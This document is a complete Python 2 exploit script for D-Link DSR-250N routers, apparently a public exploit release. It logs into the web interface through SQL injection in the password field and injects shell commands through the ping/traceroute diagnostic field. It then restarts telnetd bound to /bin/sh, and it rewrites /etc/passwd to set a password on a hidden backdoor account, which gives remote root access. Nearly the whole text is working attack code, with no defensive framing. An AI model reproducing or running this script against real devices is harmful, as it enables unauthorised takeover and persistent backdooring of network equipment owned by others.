#!/usr/bin/python

 
import httplib
import urllib
import telnetlib
import time
import sys
import crypt
import random
import string
 
 
##############################
#
# CHANGE THESE VALUES -- BEGIN
#
# Your router's IP:PORT
ipaddr = "www.example.com"
# Password to be set (by this hack) on the backdoor account
bdpasswd = "password"
#
# CHANGE THESE VALUES -- END
#
# persistent config file:    /tmp/teamf1.cfg.ascii
#                            Edit this file to make your changes 
persistent.
#
##############################
 
 
cookie = ""
pid = -2
bduser = ""
     
 
def request(m = "", u = "", b = "", h = ""):
    global ipaddr
    conn = httplib.HTTPSConnection(ipaddr, timeout = 15)
    assert m in ["GET", "POST"]
    conn.request(method = m, url = u, body = b, headers = h)
    ret = conn.getresponse()
    header = ret.getheaders()
    data = ret.read()
    conn.close()
    return (header, data)
 
 
def login(user, passwd):
    global ipaddr
    headers = {'Accept': 
"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               'User-Agent': "Exploit",
               'Referer': "https://" + ipaddr + 
"/scgi-bin/platform.cgi",
               'Content-Type': "application/x-www-form-urlencoded"}
    body = {'thispage'                          : "index.htm",
            'Users.UserName'                    : user,
            'Users.Password'                    : passwd,
            'button.login.Users.deviceStatus'   : "Login",
            'Login.userAgent'                   : "Exploit"}
    return request("POST", "/scgi-bin/platform.cgi", 
urllib.urlencode(body), headers)
     
     
def logout():
    global ipaddr, cookie
    headers = {'Accept': 
"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               'User-Agent': "Exploit",
               'Referer': "https://" + ipaddr + 
"/scgi-bin/platform.cgi",
               'Content-Type': "application/x-www-form-urlencoded"}
    body = ""
    return request("GET", "/scgi-bin/platform.cgi?page=index.htm", 
urllib.urlencode(body), headers)
 
 
def execCmd(cmd = None):
    global ipaddr, cookie
    assert cmd != None
    headers = {'Accept': 
"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               'User-Agent': "Exploit",
               'Referer': "https://" + ipaddr + 
"/scgi-bin/platform.cgi?page=systemCheck.htm",
               'Cookie': cookie,
               'Content-Type': "application/x-www-form-urlencoded"}
    body = {'thispage'                          : "systemCheck.htm",
            'ping.ip'                           : "lwww.example1.com;" + 
cmd,
            'button.traceroute.diagDisplay'     : "Traceroute"}
    return request("POST", "/scgi-bin/platform.cgi", 
urllib.urlencode(body), headers)
 
 
def findPid(mystr = None):
    # "  957 root      2700 S    /usr/sbin/telnetd -l /bin/login"
    assert mystr != None
    mypid = 0
    (h, d) = execCmd(cmd = "ps|grep telnetd|grep -v grep");
    s = d.find(mystr)
    if s > 0:
        # telnetd is running
        cand = d[s - 50 : s]
        try:
            mypid = int(cand.split("\n")[1].split()[0])
        except IndexError:
            mypid = int(cand.split(">")[1].split()[0])
    return mypid
 
 
def restartTelnetd(mystr1 = None, mystr2 = None):
    assert mystr1 != None and mystr2 != None
    global pid
    pid = findPid("telnetd -l /bin/")
    if pid > 0:
        # Stopping the running telnetd
        print "[+] Stopping telnetd (" + str(pid) + "): ",
        sys.stdout.flush()
        (h, d) = execCmd("kill " + str(pid))
        pid = findPid(mystr1)
        if pid > 0:
            print "FAILURE"
            sys.exit(-1)
        else:
            print "OK"
    # Starting a new telnetd
    print "[+] Starting telnetd: ",
    sys.stdout.flush()
    (h, d) = execCmd("telnetd -l " + mystr2)
    pid = findPid("telnetd -l " + mystr2)
    if pid > 0:
        print "OK (" + str(pid) + ")"
    else:
        print "FAILURE"
        sys.exit(-1)
     
 
def main():
    global ipaddr, cookie, pid, bduser, bdpasswd
    user = "admin"
    passwd = "' or 'a'='a"
    print "\n\nPrivilege Escalation exploit for D-Link DSR-250N (and 
maybe other routers)"
    print "This change is non-persistent to device reboots."
    print "Created and coded by 0_o (nu11.nu11 [at] yahoo.com)\n\n"
    # Logging into the router
    print "[+] Trying to log into the router: ",
    sys.stdout.flush()
    (h, d) = login(user, passwd)
    if d.find("User already logged in") > 0:
        print "FAILURE"
        print "[-] The user \"admin\" is still logged in. Please log out 
from your current session first."
        sys.exit(-1)
    elif d.find('<a href="?page=index.htm">Logout</a>') > 0:
        while h:
            (c1, c2) = h.pop()
            if c1 == 'set-cookie':
                cookie = c2
                break
        print "OK (" + cookie + ")"
    elif d.find("Invalid username or password") > 0:
        print "FAILURE"
        print "[-] Invalid username or password"
        sys.exit(-1)
    else:
        print "FAILURE"
        print "[-] Unable to login."
        sys.exit(-1)
         
    # Starting a telnetd with custom parameters
    print "[+] Preparing the hack..."
    restartTelnetd("/bin/login", "/bin/sh")
     
    # Do the h4cK
    print "[+] Hacking the router..."
    print "[+] Getting the backdoor user name: ",
    sys.stdout.flush()
    tn = telnetlib.Telnet(ipaddr.split(":")[0])
    tn.read_very_eager()
    tn.write("cat /etc/profile\n")
    time.sleep(5)
    data = tn.read_very_eager()
    for i in data.split("\n"):
        if i.find('"$USER"') > 0:
            bduser = i.split('"')[3]
            break
    if len(bduser) > 0:
        print "OK (" + bduser + ")"
    else:
        print "FAILURE"
        sys.exit(-1)
    print "[+] Setting the new password for " + bduser + ": ",
    sys.stdout.flush()
    tn.write("cat /etc/passwd\n")
    time.sleep(5)
    data = tn.read_very_eager()
    data = data.split("\n")
    data.reverse()
    data.pop()
    data.reverse()
    data.pop()
    data = "\n".join(data)
    for i in data.split("\n"):
        if i.find(bduser) >= 0:
            line = i.split(':')
            s1 = string.lowercase + string.uppercase + string.digits
            salt = ''.join(random.sample(s1,2))
            pw = crypt.crypt(bdpasswd, salt)
            line[1] = pw
            # doesn't work for some odd reason -- too lazy to find out 
why
            #salt = ''.join(random.sample(s1,8))
            #line[1] = crypt.crypt(bdpasswd, '$1$' + salt + '$')
            data = data.replace(i, ":".join(line))
            break
    tn.write('echo -en "" > /etc/passwd\n')
    time.sleep(5)
    for i in data.split("\n"):
        tn.write('echo -en \'' + i + '\n\' >> /etc/passwd\n')
        time.sleep(1)
    data = tn.read_very_eager()   
    tn.close()
    if data.find(pw) >= 0:
        print "OK (" + pw + ")"
        success = True
    else:
        print "FAILURE"
        print "[-] Could not set the new password."
        sys.exit(-1)
     
    # Switching back to the originals
    print "[+] Mobbing up..."
    restartTelnetd("/bin/sh", "/bin/login")
     
    # Logging out
    print "[+] Logging out: ",
    sys.stdout.flush()
    (h, d) = logout()
    if d.find('value="Login"') > 0:
        print "OK"
    else:
        print "FAILURE"
        print "[-] Unable to determine if user is logged out."
 
    # Print success message
    if success:
        print "[+] You can now log in via SSH and Telnet by using:"
        print "    user: " + bduser
        print "    pass: " + bdpasswd
        print "    These changes will be reverted upon router reboot."
        print "    Edit \"/tmp/teamf1.cfg.ascii\" to make your changes 
persistent."
 
main()
sys.exit(0)
